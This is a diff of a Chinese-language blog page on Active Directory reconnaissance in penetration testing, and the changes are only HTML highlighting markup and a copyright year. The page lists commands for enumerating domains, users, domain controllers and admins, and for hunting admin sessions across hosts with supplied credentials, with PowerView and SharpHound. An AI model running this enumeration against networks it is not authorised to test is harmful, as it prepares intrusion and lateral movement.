-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Invoke-Portscan</span> <span class="n">-StartAddress</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">250</span><span class="p">.</span><span class="n">1</span> <span class="n">-EndAddress</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">250</span><span class="p">.</span><span class="n">255</span> <span class="n">-ResolveHost</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-Portscan</span> <span class="n">-StartAddress</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">250</span><span class="p">.</span><span class="n">1</span> <span class="n">-EndAddress</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">250</span><span class="p">.</span><span class="n">255</span> <span class="n">-ResolveHost</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="端口-banner-信息">端口 banner 信息</h4>
 <p><img
@@ -890,8 +890,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net view /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net view /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查询域内所有计算机">查询域内所有计算机</h3>
 <div class="highlight"><div class="chroma">
@@ -899,8 +899,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net view /domain:HACKE
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net view /domain:HACKE
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查询域内所有用户列表">查询域内所有用户列表</h3>
 <div class="highlight"><div class="chroma">
@@ -908,8 +908,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net group /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net group /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查询域内所有成员计算机列表">查询域内所有成员计算机列表</h3>
 <div class="highlight"><div class="chroma">
@@ -917,8 +917,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net group <span class="s2">&#34;domain computers&#34;</span> /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net group <span class="s2">&#34;domain computers&#34;</span> /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查询域密码信息">查询域密码信息</h3>
 <div class="highlight"><div class="chroma">
@@ -926,8 +926,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net accounts /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net accounts /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="获取域信任信息">获取域信任信息</h3>
 <div class="highlight"><div class="chroma">
@@ -935,8 +935,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nltest /domain_trusts
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nltest /domain_trusts
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="查找域控制器">查找域控制器</h2>
 <h3 id="查看域控制器的机器名">查看域控制器的机器名</h3>
@@ -945,8 +945,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nltest /DCLIST:DomainName
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nltest /DCLIST:DomainName
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查看域控制器的主机名">查看域控制器的主机名</h3>
 <div class="highlight"><div class="chroma">
@@ -954,8 +954,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nslookup -type=SRV _ldap._tcp.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nslookup -type=SRV _ldap._tcp.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查看当前时间">查看当前时间</h3>
 <div class="highlight"><div class="chroma">
@@ -963,8 +963,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net time /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net time /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查看域控制器组">查看域控制器组</h3>
 <div class="highlight"><div class="chroma">
@@ -972,16 +972,16 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net group <span class="s2">&#34;Domain Controllers&#34;</span> /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net group <span class="s2">&#34;Domain Controllers&#34;</span> /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netdom query pdc
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netdom query pdc
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="获取域内的用户和管理员信息">获取域内的用户和管理员信息</h2>
 <h3 id="查询所有域用户列表">查询所有域用户列表</h3>
@@ -991,8 +991,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net user /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="获取域内用户的详细信息">获取域内用户的详细信息</h4>
 <div class="highlight"><div class="chroma">
@@ -1000,8 +1000,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic useraccount get /all
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic useraccount get /all
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查看存在的用户">查看存在的用户</h4>
 <div class="highlight"><div class="chroma">
@@ -1009,8 +1009,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">dsquery user
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">dsquery user
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查询本地管理员组用户">查询本地管理员组用户</h4>
 <div class="highlight"><div class="chroma">
@@ -1018,8 +1018,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net localgroup administrators
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net localgroup administrators
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查询域管理员用户">查询域管理员用户</h3>
 <h4 id="查询域管理员用户-1">查询域管理员用户</h4>
@@ -1028,8 +1028,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net group <span class="s2">&#34;domain admins&#34;</span> /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net group <span class="s2">&#34;domain admins&#34;</span> /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查询管理员用户">查询管理员用户</h4>
 <div class="highlight"><div class="chroma">
@@ -1037,8 +1037,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net group <span class="s2">&#34;Enterprise Admins&#34;</span> /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net group <span class="s2">&#34;Enterprise Admins&#34;</span> /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="定位域管理员">定位域管理员</h2>
 <h3 id="常用工具">常用工具</h3>
@@ -1048,8 +1048,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">pslogon.exe \\DC
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">pslogon.exe \\DC
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="pvefindaduserexe">PVEFindADUser.exe</h4>
 <div class="highlight"><div class="chroma">
@@ -1057,8 +1057,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">PVEFindADUser.exe -current
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">PVEFindADUser.exe -current
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="netviewexe">netview.exe</h4>
 <h4 id="nmap的脚本">nmap的脚本</h4>
@@ -1100,8 +1100,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">usemode situational_awareness/network/powerview/user_hunter
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">usemode situational_awareness/network/powerview/user_hunter
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="查找域管进程">查找域管进程</h2>
 <h3 id="本机检查">本机检查</h3>
@@ -1111,8 +1111,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net group <span class="s2">&#34;Domain Admins&#34;</span> /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net group <span class="s2">&#34;Domain Admins&#34;</span> /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="列出本机的所有进程及进程用户">列出本机的所有进程及进程用户</h4>
 <div class="highlight"><div class="chroma">
@@ -1120,8 +1120,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">tasklist /v 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">tasklist /v 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查询域控的域用户会话">查询域控的域用户会话</h3>
 <p><a href="https://github.com/nullbind/Other-Projects/tree/master/GDA" target="_blank" rel="noopener noreffer">https://github.com/nullbind/Other-Projects/tree/master/GDA</a></p>
@@ -1134,9 +1134,9 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">FOR</span> <span class="k">/F</span> <span class="nv">%i in (ips.txt) DO @echo [+] %</span>i <span class="p">&amp;&amp;</span> @tasklist /V /S %i /U user /P password <span class="mi">2</span><span class="p">&gt;</span>NUL <span class="p">&gt;</span> output.txt <span class="p">&amp;&amp;</span> 
-<span class="k">FOR</span> <span class="k">/F</span> <span class="nv">%n in (names.txt) DO @type output.txt | findstr %</span>n <span class="p">&gt;</span> NUL <span class="p">&amp;&amp;</span> echo [!] <span class="nv">%n was found running a process on %</span>i <span class="p">&amp;&amp;</span> <span class="k">pause</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">FOR</span> <span class="k">/F</span> <span class="nv">%i in (ips.txt) DO @echo [+] %</span>i <span class="p">&amp;&amp;</span> @tasklist /V /S %i /U user /P password <span class="mi">2</span><span class="p">&gt;</span>NUL <span class="p">&gt;</span> output.txt <span class="p">&amp;&amp;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">FOR</span> <span class="k">/F</span> <span class="nv">%n in (names.txt) DO @type output.txt | findstr %</span>n <span class="p">&gt;</span> NUL <span class="p">&amp;&amp;</span> echo [!] <span class="nv">%n was found running a process on %</span>i <span class="p">&amp;&amp;</span> <span class="k">pause</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="扫描远程系统的-netbios-信息">扫描远程系统的 NetBIOS 信息</h3>
 <p>首先，从<code>Domain Admins</code>组中收集域管理员列表</p>
@@ -1146,8 +1146,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">for</span> <span class="k">/F</span> <span class="nv">%i in (ips.txt) do @echo [+] Checking %</span>i <span class="p">&amp;&amp;</span> nbtstat -A <span class="nv">%i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %</span>n in (admins.txt<span class="p">)</span> <span class="k">DO</span> <span class="p">@</span><span class="k">type</span> nbsessions.txt <span class="p">|</span> findstr /I <span class="nv">%n &gt; NUL &amp;&amp; echo [!] %</span>n was found logged into %i
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">for</span> <span class="k">/F</span> <span class="nv">%i in (ips.txt) do @echo [+] Checking %</span>i <span class="p">&amp;&amp;</span> nbtstat -A <span class="nv">%i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %</span>n in (admins.txt<span class="p">)</span> <span class="k">DO</span> <span class="p">@</span><span class="k">type</span> nbsessions.txt <span class="p">|</span> findstr /I <span class="nv">%n &gt; NUL &amp;&amp; echo [!] %</span>n was found logged into %i
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="bloodhound-工具">BloodHound 工具</h3>
 <div class="highlight"><div class="chroma">
@@ -1155,8 +1155,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">brew services start neo4j
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">brew services start neo4j
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="收集脚本">收集脚本</h4>
 <p><a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors" target="_blank" rel="noopener noreffer">https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors</a></p>
@@ -1165,8 +1165,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">SharpHound.exe -c all
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">SharpHound.exe -c all
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
@@ -1196,7 +1196,7 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
